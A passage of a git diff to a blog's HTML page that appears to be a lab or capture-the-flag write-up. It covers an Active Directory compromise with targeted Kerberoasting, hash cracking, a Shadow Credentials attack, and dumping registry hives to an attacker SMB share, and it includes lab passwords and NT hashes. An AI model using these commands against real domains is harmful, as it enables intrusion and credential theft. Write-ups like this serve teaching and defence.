-distinguishedName: <span class="nv">CN</span><span class="o">=</span>mustafa.yaseen,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE  
-distinguishedName: <span class="nv">CN</span><span class="o">=</span>S-1-5-11,CN<span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'abdullah.azooz'  -p 'PetraEnjoyer1950' get writable  
+distinguishedName: CN=abdullah.azooz,CN=Users,DC=albalad,DC=bsides,DC=rvpermission: WRITE  
+distinguishedName: CN=mustafa.yaseen,CN=Users,DC=albalad,DC=bsides,DC=rvpermission: WRITE  
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=albalad,DC=bsides,DC=rvpermission: WRITE
 </code></pre></div></div>
 
 <p><br /></p>
@@ -615,28 +622,28 @@ distinguishedName: <span class="nv">CN</span><span class="o">=</span>S-1-5-11,CN
 <h3 id="targeted-kerberoasting">Targeted Kerberoasting</h3>
 <p>The first option here would be to use targeted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, <code class="language-plaintext highlighter-rouge">GenericWrite</code>, <code class="language-plaintext highlighter-rouge">WriteProperty</code>. we can add an SPN (<code class="language-plaintext highlighter-rouge">ServicePrincipalName</code>) to that account. Once the account has an SPN, it becomes vulnerable to <a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast">Kerberoasting</a>. This technique is called Targeted Kerberoasting.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>targetedKerberoast.py <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> abdullah.azooz  <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> <span class="nt">--request-user</span> mustafa.yaseen <span class="nt">-o</span> mustafa.txt[<span class="k">*</span><span class="o">]</span> Starting kerberoast attacks  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attacking user <span class="o">(</span>mustafa.yaseen<span class="o">)</span>  
-<span class="o">[</span>+] Writing <span class="nb">hash </span>to file <span class="k">for</span> <span class="o">(</span>mustafa.yaseen<span class="o">)</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>targetedKerberoast.py -d albalad.bsides.rv -u abdullah.azooz  -p 'PetraEnjoyer1950' --request-user mustafa.yaseen -o mustafa.txt[*] Starting kerberoast attacks  
+[*] Attacking user (mustafa.yaseen)  
+[+] Writing hash to file for (mustafa.yaseen)  
 </code></pre></div></div>
 
 <p>Now we have accomplished the attack lets look at the hash</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">mustafa</span><span class="p">.</span><span class="n">txt</span>  
-<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="o">*</span><span class="n">mustafa</span><span class="p">.</span><span class="n">yaseen</span><span class="err">$</span><span class="n">ALBALAD</span><span class="p">.</span><span class="n">BSIDES</span><span class="p">.</span><span class="n">RV</span><span class="err">$</span><span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span><span class="o">/</span><span class="n">mustafa</span><span class="p">.</span><span class="n">yaseen</span><span class="o">*</span><span class="err">$</span><span class="n">d3f68ab888e41429dd9c0a33721caa7e</span><span class="err">$</span><span class="n">e069b57e798b66b4c291d5dd9e98cf3e1909b05636450b841eaaa5fb51a8255dc8415118938f4e78424c5d406a60636fa6e7efbdb45b68928b6f53848a4a9530a3e335be2b53d4037b6cdc7e4672d12189cc3ddced2c449a8dcaccb6b8e6d4a4ea2bbb22c082dec9cdc478e0a38ce2f56610cbef7a610f5680c56368fe4140892f27d647eb966cc4b4417cc2bd3efd798e63b2a804bea66609d867668c647d769b97b6158ae8e2e51a659dd2f607b7ca0fc163eca129a34e93f9632bd4861763bc6f6a86dc4f2e44e829acc52ae5583fd90a34f74c07371dbbf3b5445c0a8e3db295b342a36638de367427a8df8f324a73b3a04dbb46b725ac87f84b94acb976ad5e1237c8ed56598a6fc5ba9b89957c75ecea7b5893a7a57438e965b594a1fcbd96910319c1e5fdf0492860141d59151d7ee937a08ecdb12e5c2046832de34c0143167184105212a2e1a02f3539686d9bbb193b1d5da10787070b20cb968c9075321ff02c4a76f184330a0fe98c7b2d9d37509164ed70000f9921313a36bd139f5b660647fada22dd0638ee30176f5067d1242b51bc106daac55ea6139ada5c20a2d06d828596e6403328472a728230b6c73f4bb31a11bd01d2c8df3774c1388c5d6edb47b6412cd46c1af8c30814db73ece3ddeaab5bc47c3ab445bcfb637488e45c11b71bd391537dd2f8b156a7949c3b9a4f5dee7d11b9759c53797fbcaafd67bf4f62f6363c9f52a1cce72cb5df2b43a2755a7e4ff8ef0a78a1dc356dd2c95b35a38890dcaca550bb579a63921d1d0558c5faece1622a0b64cc11522b32a195e6322db86fc1922648db92c1d8d19b66a1bdcf29cd7d75bfb8592e4a502ccafd9e075b37f5dec34ba2400cbb9a0bc583bcdeca81fbcb5f382666ea77bb2e7bbf046254b430213a6a82cb091ee2231aab8d6e454213cf35bbfb4617e7c4c46b089745b1f9812d67beb1883fa132808893c2a0af9774e0ff8e587a7dc26277e37c79660986f39ed700681541b9ff20c13adc970e07e64765fd86e12e80f17e8fbbbd994bc2b8c1801eb3fb01d83066ef1df30b0788d434cb409ddc92031c45fa0aee003ba063f30ff39dee66648a3e048324eb8f22571ceaac3fbe6ffe8b90869f107be104e214a6ccebd0d3a066c5d1d8ecfc883a673a8dbdcea3cfad2d4e8f1ba81265dea4b1ca153e76ade509230977d35a01e6658b7f673290085b180125d3b618b9dce7bb3ddc5c9b00723dee7f36e23c652931915a4fd6a3d073adf994cabc53a4af8d982abc5b1af3f444c5d89c67019735a3d9ae7114a6d4d621a5c739733763f76f30ad0018cf90cd82e04dc497c1221d7380b2596b4719a5a6a4070ac0c5104f08528a8abaf98c172f476bcefd9c6315189febff41d542e144ccd308fef982803ef87e9a7021d8bd7316a9d8dd6ed3e641f4c3b56669aac8e6a6215881a14e9bd6956420be03c352d6fcc2848f79d87e752e9450eeea00eac37d3350c126194df2a344ad8209af334e116fafc5040aeb4e0f0dff4119f8c3d54a50fa52f38c55c071</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat mustafa.txt  
+$krb5tgs$23$*mustafa.yaseen$ALBALAD.BSIDES.RV$albalad.bsides.rv/mustafa.yaseen*$d3f68ab888e41429dd9c0a33721caa7e$e069b57e798b66b4c291d5dd9e98cf3e1909b05636450b841eaaa5fb51a8255dc8415118938f4e78424c5d406a60636fa6e7efbdb45b68928b6f53848a4a9530a3e335be2b53d4037b6cdc7e4672d12189cc3ddced2c449a8dcaccb6b8e6d4a4ea2bbb22c082dec9cdc478e0a38ce2f56610cbef7a610f5680c56368fe4140892f27d647eb966cc4b4417cc2bd3efd798e63b2a804bea66609d867668c647d769b97b6158ae8e2e51a659dd2f607b7ca0fc163eca129a34e93f9632bd4861763bc6f6a86dc4f2e44e829acc52ae5583fd90a34f74c07371dbbf3b5445c0a8e3db295b342a36638de367427a8df8f324a73b3a04dbb46b725ac87f84b94acb976ad5e1237c8ed56598a6fc5ba9b89957c75ecea7b5893a7a57438e965b594a1fcbd96910319c1e5fdf0492860141d59151d7ee937a08ecdb12e5c2046832de34c0143167184105212a2e1a02f3539686d9bbb193b1d5da10787070b20cb968c9075321ff02c4a76f184330a0fe98c7b2d9d37509164ed70000f9921313a36bd139f5b660647fada22dd0638ee30176f5067d1242b51bc106daac55ea6139ada5c20a2d06d828596e6403328472a728230b6c73f4bb31a11bd01d2c8df3774c1388c5d6edb47b6412cd46c1af8c30814db73ece3ddeaab5bc47c3ab445bcfb637488e45c11b71bd391537dd2f8b156a7949c3b9a4f5dee7d11b9759c53797fbcaafd67bf4f62f6363c9f52a1cce72cb5df2b43a2755a7e4ff8ef0a78a1dc356dd2c95b35a38890dcaca550bb579a63921d1d0558c5faece1622a0b64cc11522b32a195e6322db86fc1922648db92c1d8d19b66a1bdcf29cd7d75bfb8592e4a502ccafd9e075b37f5dec34ba2400cbb9a0bc583bcdeca81fbcb5f382666ea77bb2e7bbf046254b430213a6a82cb091ee2231aab8d6e454213cf35bbfb4617e7c4c46b089745b1f9812d67beb1883fa132808893c2a0af9774e0ff8e587a7dc26277e37c79660986f39ed700681541b9ff20c13adc970e07e64765fd86e12e80f17e8fbbbd994bc2b8c1801eb3fb01d83066ef1df30b0788d434cb409ddc92031c45fa0aee003ba063f30ff39dee66648a3e048324eb8f22571ceaac3fbe6ffe8b90869f107be104e214a6ccebd0d3a066c5d1d8ecfc883a673a8dbdcea3cfad2d4e8f1ba81265dea4b1ca153e76ade509230977d35a01e6658b7f673290085b180125d3b618b9dce7bb3ddc5c9b00723dee7f36e23c652931915a4fd6a3d073adf994cabc53a4af8d982abc5b1af3f444c5d89c67019735a3d9ae7114a6d4d621a5c739733763f76f30ad0018cf90cd82e04dc497c1221d7380b2596b4719a5a6a4070ac0c5104f08528a8abaf98c172f476bcefd9c6315189febff41d542e144ccd308fef982803ef87e9a7021d8bd7316a9d8dd6ed3e641f4c3b56669aac8e6a6215881a14e9bd6956420be03c352d6fcc2848f79d87e752e9450eeea00eac37d3350c126194df2a344ad8209af334e116fafc5040aeb4e0f0dff4119f8c3d54a50fa52f38c55c071  
 </code></pre></div></div>
 
 <p>Attempting to crack it will lead us to cracking the password!</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">mustafa</span><span class="p">.</span><span class="n">txt</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john -w=/usr/share/wordlists/rockyou.txt mustafa.txt  
   
-<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>  
-<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">TGS</span> <span class="n">etype</span> <span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span><span class="p">])</span>  
-<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>  
-<span class="n">Press</span> <span class="s">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>  
-<span class="n">whybackup88</span>      <span class="p">(</span><span class="err">?</span><span class="p">)</span>     <span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">30</span> <span class="mi">08</span><span class="p">:</span><span class="mi">50</span><span class="p">)</span> <span class="mf">0.6060</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1673</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="n">whyband</span><span class="p">..</span><span class="n">whosline18</span>  
-<span class="n">Use</span> <span class="n">the</span> <span class="s">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>  
-<span class="n">Session</span> <span class="n">completed</span><span class="p">.</span>   
+Using default input encoding: UTF-8  
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Will run 4 OpenMP threads  
+Press 'q' or Ctrl-C to abort, almost any other key for status  
+whybackup88      (?)     1g 0:00:00:01 DONE (2025-04-30 08:50) 0.6060g/s 1673Kp/s 1673Kc/s 1673KC/s whyband..whosline18  
+Use the "--show" option to display all of the cracked passwords reliably  
+Session completed.   
 </code></pre></div></div>
 
 <h3 id="shadow-credentials-attack">Shadow Credentials Attack</h3>
@@ -645,34 +652,34 @@ distinguishedName: <span class="nv">CN</span><span class="o">=</span>S-1-5-11,CN
 
 <p>Active Directory user and computer objects include an <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute where public keys can be stored, when enabling PKINIT pre-authentication the KDC validates that a user possesses the corresponding private key before issuing a TGT. If an attacker gains permissions to modify another object’s <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code>—for example, via group membership or elevated ACEs—they can inject their own public key and thereafter authenticate as that account, granting them persistent, stealthy access to the target.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali ~&gt; certipy shadow auto <span class="nt">-u</span> abdullah.azooz@albalad.bsides.rv <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> <span class="nt">-account</span> mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali ~&gt; certipy shadow auto -u abdullah.azooz@albalad.bsides.rv -p 'PetraEnjoyer1950' -account mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak (ly4k)  
   
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'680cfc70-0879-746b-8fbb-15f4be90b1d3'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'mustafa.yaseen'</span> with the certificate  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: mustafa.yaseen@albalad.bsides.rv  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'mustafa.yaseen.ccache'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'mustafa.yaseen'</span>: 409a45a42c916885ac56127bebf06225  
+[*] Targeting user 'mustafa.yaseen'  
+[*] Generating certificate  
+[*] Certificate generated  
+[*] Generating Key Credential  
+[*] Key Credential generated with DeviceID '680cfc70-0879-746b-8fbb-15f4be90b1d3'  
+[*] Adding Key Credential with device ID '680cfc70-0879-746b-8fbb-15f4be90b1d3' to the Key Credentials for 'mustafa.yaseen'  
+[*] Successfully added Key Credential with device ID '680cfc70-0879-746b-8fbb-15f4be90b1d3' to the Key Credentials for 'mustafa.yaseen'  
+[*] Authenticating as 'mustafa.yaseen' with the certificate  
+[*] Using principal: mustafa.yaseen@albalad.bsides.rv  
+[*] Trying to get TGT...  
+[*] Got TGT  
+[*] Saved credential cache to 'mustafa.yaseen.ccache'  
+[*] Trying to retrieve NT hash for 'mustafa.yaseen'  
+[*] Restoring the old Key Credentials for 'mustafa.yaseen'  
+[*] Successfully restored the old Key Credentials for 'mustafa.yaseen'  
+[*] NT hash for 'mustafa.yaseen': 409a45a42c916885ac56127bebf06225  
 </code></pre></div></div>
 
 <h3 id="group-enumeration">Group Enumeration</h3>
 
 <p>Using this hash we can authenticate as this user and we could see that this user is a member of backup operators.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD <span class="nt">--host</span> 10.2.10.11 <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'mustafa.yaseen'</span>  <span class="nt">-p</span> <span class="s1">':409a45a42c916885ac56127bebf06225'</span> get membership mustafa.yaseen  
-distinguishedName: <span class="nv">CN</span><span class="o">=</span>Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-32-545sAMAccountName: Users  
-distinguishedName: <span class="nv">CN</span><span class="o">=</span>Backup Operators,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
-distinguishedName: <span class="nv">CN</span><span class="o">=</span>Domain Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'mustafa.yaseen'  -p ':409a45a42c916885ac56127bebf06225' get membership mustafa.yaseen  
+distinguishedName: CN=Users,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-545sAMAccountName: Users  
+distinguishedName: CN=Backup Operators,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
+distinguishedName: CN=Domain Users,CN=Users,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
 </code></pre></div></div>
 <p><br /></p>
 
@@ -680,79 +687,79 @@ distinguishedName: <span class="nv">CN</span><span class="o">=</span>Domain User
 <h3 id="transfering-the-files-over">Transfering the files over</h3>
 <p>To minimize our footprint we are going to dump the SAM, SYSTEM &amp; SECURITY on our attack box by first setting up an SMB Server</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py sawyer <span class="nb">.</span> <span class="nt">-smb2supportImpacket</span> v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.2.10.11,61022<span class="o">)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>DC01<span class="o">)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC01<span class="se">\ </span>authenticated successfully  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:sawyer<span class="o">)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>albalad<span class="se">\D</span>C01<span class="nv">$,</span>DC01<span class="o">)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC01<span class="se">\D</span>C01<span class="nv">$ </span>authenticated successfully  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py sawyer . -smb2supportImpacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+[*] Config file parsed  
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
+[*] Config file parsed  
+[*] Config file parsed  
+[*] Incoming connection (10.2.10.11,61022)  
+[*] AUTHENTICATE_MESSAGE (\,DC01)  
+[*] User DC01\ authenticated successfully  
+[*] :::00::aaaaaaaaaaaaaaaa  
+[*] Connecting Share(1:IPC$)  
+[*] Connecting Share(2:sawyer)  
+[*] AUTHENTICATE_MESSAGE (albalad\DC01$,DC01)  
+[*] User DC01\DC01$ authenticated successfully  
   
 </code></pre></div></div>
 <p>then dumping it to that remote location</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup <span class="nt">-o</span> <span class="s1">'\\\\198.51.100.2\\sawyer\\'</span>Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
-<span class="o">[!]</span> Cannot check RemoteRegistry status. Triggering start trough named pipe...  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>AM to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SAM.save  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>YSTEM to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SYSTEM.save  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved HKLM<span class="se">\S</span>ECURITY to <span class="se">\\</span>198.51.100.2<span class="se">\s</span>awyer<span class="se">\\</span>SECURITY.save  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup -o '\\\\198.51.100.2\\sawyer\\'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...  
+[*] Saved HKLM\SAM to \\198.51.100.2\sawyer\\SAM.save  
+[*] Saved HKLM\SYSTEM to \\198.51.100.2\sawyer\\SYSTEM.save  
+[*] Saved HKLM\SECURITY to \\198.51.100.2\sawyer\\SECURITY.save  
 </code></pre></div></div>
 
 <p>So now we can dump everything locally!, Lets first start by dumping the SAM</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">sam</span> <span class="s">'SAM.save'</span> <span class="o">-</span><span class="n">system</span> <span class="s">'SYSTEM.save'</span> <span class="n">LOCAL</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py -sam 'SAM.save' -system 'SYSTEM.save' LOCAL  
   
   
-<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">13.0</span><span class="p">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20250307.160229</span><span class="p">.</span><span class="mf">6e0</span><span class="n">a969</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>   
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x6f5fdaf97f208b1c48ab1cf9d83438e6</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">local</span> <span class="n">SAM</span> <span class="n">hashes</span> <span class="p">(</span><span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>  
-<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">f993698383cc8dc572e8abae5f71c7a1</span><span class="p">:::</span>  
-<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>  
-<span class="n">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="p">...</span>   
+Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+[*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
+[*] Cleaning up...   
 </code></pre></div></div>
 
 <p>Despite our efforts, the Domain Administrator hashes could not be obtained from here. The next step will be attempting to dump the SYSTEM registry hive</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">system</span> <span class="n">SYSTEM</span><span class="p">.</span><span class="n">save</span> <span class="o">-</span><span class="n">security</span> <span class="n">SECURITY</span><span class="p">.</span><span class="n">save</span> <span class="n">LOCAL</span>  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py -system SYSTEM.save -security SECURITY.save LOCAL  
   
   
-<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">13.0</span><span class="p">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20250307.160229</span><span class="p">.</span><span class="mf">6e0</span><span class="n">a969</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>   
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x6f5fdaf97f208b1c48ab1cf9d83438e6</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">cached</span> <span class="n">domain</span> <span class="n">logon</span> <span class="n">information</span> <span class="p">(</span><span class="n">domain</span><span class="o">/</span><span class="n">username</span><span class="p">:</span><span class="nb">hash</span><span class="p">)</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">LSA</span> <span class="n">Secrets</span>  
